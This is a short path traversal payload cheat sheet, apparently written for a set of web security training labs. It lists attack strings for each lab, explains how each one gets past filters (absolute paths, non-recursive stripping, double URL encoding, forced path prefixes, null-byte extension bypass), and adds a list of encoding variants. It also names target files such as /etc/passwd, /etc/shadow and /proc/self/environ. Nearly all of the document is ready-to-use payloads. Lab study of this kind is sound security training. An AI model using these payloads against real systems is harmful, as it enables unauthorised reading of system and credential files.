# 📋 Path Traversal — Payload Cheat Sheet

| Lab | Payload | Explanation |
|-----|---------|-------------|
| 1) Simple case | `../../../etc/passwd` | No filters in place, allowing direct traversal from the images directory to the root. |
| 2) Traversal sequences blocked with absolute path bypass | `/etc/passwd` | The application blocks `../`, but doesn't validate absolute paths, so we can reference `/etc/passwd` directly. |
| 3) Traversal sequences stripped non-recursively | `....//....//....//etc/passwd` | The filter only removes `../` once. By using `....//`, stripping leaves behind `../`, allowing traversal. |
| 4) Traversal sequences stripped with superfluous URL-decode | `..%252f..%252f..%252fetc/passwd` | Double URL encoded. The first decode turns `%252f` into `%2f`, and the second turns it into `/`, reconstructing `../`. |
| 5) Validation of start of path | `/var/www/images/../../../etc/passwd` | The app requires the path to start with `/var/www/images/`. We prepend it, then traverse up past it with `../../../` to reach root. |
| 6) Validation of file extension with null byte bypass | `../../../etc/passwd%00.jpg` | The app forces a `.jpg` extension. A null byte (`%00`) terminates the string in vulnerable parsers, causing everything after it (including `.jpg`) to be ignored. |

## Other traversal variants worth trying

```
../
..\
%2e%2e%2f
%2e%2e/
..%2f
..%c0%af         (overlong UTF-8 encoding, legacy IIS bypass)
..%255c          (double-encoded backslash)
....//
....\\/
```

## Common target files (Linux-based labs)

```
/etc/passwd
/etc/hosts
/etc/shadow        (usually not world-readable)
/proc/self/environ
```
